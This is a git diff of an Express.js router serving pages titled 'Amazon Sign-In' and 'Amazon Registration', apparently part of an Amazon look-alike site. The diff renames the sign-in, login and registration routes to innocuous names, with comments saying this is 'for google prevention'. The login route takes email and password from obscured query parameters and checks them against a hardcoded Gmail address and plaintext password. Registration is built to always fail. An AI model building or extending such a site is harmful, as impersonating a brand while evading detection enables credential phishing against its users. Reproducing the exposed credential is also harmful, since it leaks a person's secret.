@@ -3,17 +3,11 @@ var express = require('express');
 var router = express.Router();
 
 
-router.get('/ap/signin', function(req, res, next) {
-  res.render('page/ap/signin-a', {
-        appUrl: req.app.locals.appUrl,
-        jsRes: req.app.locals.jsRes,
-        title: 'Amazon Sign-In'
-    });
-});
 
-router.get('/login', function(req, res, next) {
-    let emailStr = req.query.email;
-    let passwordStr = req.query.password;
+// 'stuck' is named for login which is used before. now changed for google prevention
+router.get('/stuck', function(req, res, next) {
+    let emailStr = req.query.one;
+    let passwordStr = req.query.two;
     let origUrlStr = req.query.origUrl;
     
     if(emailStr === 'iqbalhossain9069@gmail.com' && passwordStr === '123Saiza@@@'){
@@ -38,6 +32,20 @@ router.get('/login', function(req, res, next) {
     }
 });
 
+// this url handles the request from account registration
+// but for the purpose of this site no account could be registered
+// we are sending a flag saying the page that it should show
+// an error message
+// 'happy' is named for registration which is used before. now changed for google prevention
+router.get('/happy', function(req, res, next) {
+    req.app.locals.loggedIn = false;
+    res.render('page/ap/registration-a', {
+        appUrl: req.app.locals.appUrl,
+        jsRes: req.app.locals.jsRes,
+        title: 'Amazon Registration',
+        errMsg: true
+    });
+});
 
 router.get('/ap/signout', function(req, res, next) {
     req.app.locals.loggedIn = false;
@@ -48,6 +56,18 @@ router.get('/ap/signout', function(req, res, next) {
     });
 });
 
+
+
+
+// 'go' is named for signin which is used before. now changed for google prevention
+router.get('/ap/go', function(req, res, next) {
+  res.render('page/ap/signin-a', {
+        appUrl: req.app.locals.appUrl,
+        jsRes: req.app.locals.jsRes,
+        title: 'Amazon Sign-In'
+    });
+});
+
 router.get('/ap/registration', function(req, res, next) {
     res.render('page/ap/registration-a', {
         appUrl: req.app.locals.appUrl,
@@ -55,21 +75,6 @@ router.get('/ap/registration', function(req, res, next) {
         title: 'Amazon Registration'
     });
 });
-
-// this url handles the request from account registration
-// but for the purpose of this site no account could be registered
-// we are sending a flag saying the page that it should show
-// an error message
-router.get('/register', function(req, res, next) {
-    req.app.locals.loggedIn = false;
-    res.render('page/ap/registration-a', {
-        appUrl: req.app.locals.appUrl,
-        jsRes: req.app.locals.jsRes,
-        title: 'Amazon Registration',
-        errMsg: true
-    });
-});
-
 
 
 
